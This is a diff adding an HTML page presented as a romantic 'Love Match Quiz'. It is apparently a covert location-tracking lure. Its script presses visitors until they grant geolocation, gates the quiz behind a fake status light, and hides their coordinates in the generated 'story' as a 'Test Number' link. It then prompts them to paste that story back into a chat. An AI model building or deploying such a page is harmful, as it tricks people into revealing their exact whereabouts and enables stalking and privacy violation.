@@ -1,1 +1,213 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Love Match Quiz</title>
+<link href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap" rel="stylesheet">
+<meta property="og:image" content="ogimage.jpeg">
+<meta property="og:image:type" content="image/jpeg">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+  <style>
+  body {
+    font-family: 'Arial', sans-serif;
+    background: linear-gradient(to bottom right, #ff9a9e, #fad0c4);
+    padding: 20px;
+    color: #fff;
+    text-align: center;
+  }
+  h1 {
+    font-family: 'Pacifico', cursive;
+    font-size: 2.5em;
+    margin-bottom: 10px;
+  }
+  .status-light {
+    width: 15px;
+    height: 15px;
+    border-radius: 50%;
+    display: inline-block;
+    margin-left: 10px;
+    vertical-align: middle;
+  }
+  .green { background-color: #00e676; }
+  .red { background-color: #ff1744; }
+  .card {
+    background: rgba(255, 255, 255, 0.2);
+    border-radius: 15px;
+    padding: 15px;
+    margin: 15px 0;
+    box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+  }
+  .question {
+    margin: 10px 0;
+    font-weight: bold;
+  }
+  input[type="radio"] {
+    margin: 0 5px;
+  }
+  button {
+    background: #ff4d6d;
+    border: none;
+    padding: 12px 20px;
+    border-radius: 30px;
+    color: white;
+    font-size: 16px;
+    margin-top: 15px;
+    cursor: pointer;
+  }
+  button:hover {
+    background: #ff1e56;
+  }
+  #poll, #result, #share, #instagramWarning { display: none; }
 
+  #finalText {
+    word-wrap: break-word;
+    white-space: normal;
+  }
+</style>
+</head>
+<body>
+
+<h1>Love Match Quiz</h1>
+<p>Webpage Working Status
+<span id="status" class="status-light red"></span></p>
+
+<div id="instagramWarning" class="card">
+  <h3>Open in external browser</h3>
+  <p>For full functionality, please open this page in your phone’s browser (like Chrome or Safari).</p>
+  <button onclick="openInBrowser()">Open in Browser</button>
+  <br><br>
+<img src="guid.jpeg" style="width:90%; border-radius:10px; margin-bottom:10px;">
+</div>
+
+<div id="poll" class="card">
+  <div class="question">1. What do you like?</div>
+  <input type="radio" name="q1" value="Coffee"> Coffee
+  <input type="radio" name="q1" value="Tea"> Tea
+
+  <div class="question">2. Mountains or Sea?</div>
+  <input type="radio" name="q2" value="Mountains"> Mountains
+  <input type="radio" name="q2" value="Sea"> Sea
+
+  <div class="question">3. Dance or Relax?</div>
+  <input type="radio" name="q3" value="Dance"> Dance
+  <input type="radio" name="q3" value="Relax"> Relax
+
+  <div class="question">4. Car or Bike?</div>
+  <input type="radio" name="q4" value="Car"> Car
+  <input type="radio" name="q4" value="Bike"> Bike
+
+  <div class="question">5. Beach or Room?</div>
+  <input type="radio" name="q5" value="Beach"> Beach
+  <input type="radio" name="q5" value="Room"> Room
+
+  <div class="question">6. I Will Propose You or You Will Propose Me?</div>
+  <input type="radio" name="q6" value="I Will Propose You"> I Will Propose You
+  <input type="radio" name="q6" value="You Will Propose Me"> You Will Propose Me
+
+  <div class="question">7. Sleep or Romance?</div>
+  <input type="radio" name="q7" value="Sleep"> Sleep
+  <input type="radio" name="q7" value="Romance"> Romance
+
+  <div class="question">8. Wish for Happy Life or Happy Family?</div>
+  <input type="radio" name="q8" value="Happy Life"> Happy Life
+  <input type="radio" name="q8" value="Happy Family"> Happy Family
+
+  <br><button onclick="generateResult()">Submit Answers</button>
+</div>
+
+<div id="result" class="card">
+  <h3>Your Love Test Story:</h3>
+  <p id="finalText"></p>
+</div>
+
+<div id="share">
+  <h3>Copy your story:</h3>
+  <button onclick="copyResult()">Copy to Send</button>
+</div>
+
+<script>
+  let latitude = '';
+  let longitude = '';
+  let finalMessage = '';
+
+  function isInstagramBrowser() {
+    return navigator.userAgent.includes("Instagram");
+  }
+
+  function openInBrowser() {
+    alert("Tap the browser icon or 'Open in browser' option in Instagram.");
+  }
+
+  function askLocation() {
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(successLocation, failLocation);
+    } else {
+      failLocation();
+    }
+  }
+
+  function successLocation(position) {
+    latitude = position.coords.latitude;
+    longitude = position.coords.longitude;
+    document.getElementById('status').classList.remove('red');
+    document.getElementById('status').classList.add('green');
+    document.getElementById('poll').style.display = 'block';
+  }
+
+  function failLocation() {
+    document.getElementById('status').classList.remove('green');
+    document.getElementById('status').classList.add('red');
+    alert("Please allow location permission to continue.");
+    askLocation();
+  }
+
+  function generateResult() {
+    const answers = [];
+    for (let i = 1; i <= 8; i++) {
+      const selected = document.querySelector(`input[name="q${i}"]:checked`);
+      if (selected) { answers.push(selected.value); }
+    }
+
+    if (answers.length < 8) {
+      alert("Please answer all questions.");
+      return;
+    }
+
+    const story = `I want to have ${answers[0]} in a sweet morning in a bar,
+with you at the ${answers[1]}.
+
+We will ${answers[2]} together after arriving by ${answers[3]}.
+Later, we will go to ${answers[4]} where ${answers[5]} it will make the moment special.
+
+After that, we’ll choose to ${answers[6]} peacefully,
+and always wish for a ${answers[7]} together.
+
+Test Number: https://example.com/${latitude},${longitude}`;
+
+    finalMessage = story;
+    document.getElementById('finalText').innerText = finalMessage;
+    document.getElementById('result').style.display = 'block';
+    document.getElementById('share').style.display = 'block';
+
+    document.getElementById('result').scrollIntoView({ behavior: 'smooth' });
+  }
+
+  function copyResult() {
+    navigator.clipboard.writeText(finalMessage).then(function() {
+      alert('Past in Chat To Send');
+    }, function(err) {
+      alert('Failed to copy. Please try manually.');
+    });
+  }
+
+  // On page load
+  if (isInstagramBrowser()) {
+    document.getElementById('instagramWarning').style.display = 'block';
+  } else {
+    askLocation();
+  }
+</script>
+
+</body>
+</html>
